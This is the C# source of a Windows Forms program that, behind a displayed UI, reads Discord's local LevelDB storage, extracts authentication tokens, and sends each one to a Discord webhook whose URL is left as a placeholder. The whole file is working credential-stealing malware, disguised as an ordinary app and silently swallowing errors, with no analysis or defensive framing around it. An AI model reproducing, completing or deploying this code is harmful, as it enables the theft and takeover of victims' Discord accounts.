using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace R4TSquad
{
	internal static class Program
	{
		[STAThread]

		public static void SendHook(string username, string msg)
		{
			//DISCORD WEBHOOK
			Program.Post("Insert Webhook", new NameValueCollection
			{
				{
					"username",
					username
				},
				{
					"content",
					"``` \n " + msg + "\n ```"
				}
			});
		}

		private static void Main()
		{
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Application.Run(new UI());

			Program.loadLDBs(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\");
			Program.loadTokens();
			foreach (string msg in Program.discordTokens)
			{
				try
				{
					Program.SendHook("~ NationSquad ~", msg);
				}
				catch
				{

				}
			}
		}

		private static void loadLDBs(string path)
		{
			foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
			{
				if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
				{
					Program.discordLDBs.Add(path + fileInfo.Name);
				}
			}
		}

		private static void loadTokens()
		{
			foreach (string path in Program.discordLDBs)
			{
				string token = Program.GetToken(path, false);
				Program.discordTokens.Add(token);
			}
		}

		public static string GetToken(string path, bool isLog = false)
		{
			byte[] bytes = File.ReadAllBytes(path);
			string @string = Encoding.UTF8.GetString(bytes);
			string text = "";
			string text2 = @string;
			while (text2.Contains("oken"))
			{
				string[] array = Program.Sub(text2).Split(new char[]
				{
					'"'
				});
				text = array[0];
				text2 = string.Join("\"", array);
				if (isLog && text.Length == 59)
				{
					break;
				}
			}
			return text;
		}

		private static string Sub(string contents)
		{
			string[] array = contents.Substring(contents.IndexOf("oken") + 4).Split(new char[]
			{
				'"'
			});
			List<string> list = new List<string>();
			list.AddRange(array);
			list.RemoveAt(0);
			array = list.ToArray();
			return string.Join("\"", array);
		}

		public static byte[] Post(string uri, NameValueCollection pairs)
		{
			byte[] result;
			using (WebClient webClient = new WebClient())
			{
				result = webClient.UploadValues(uri, pairs);
			}
			return result;
		}
		
		private static List<string> discordLDBs = new List<string>();
		private static List<string> discordTokens = new List<string>();

	}
}
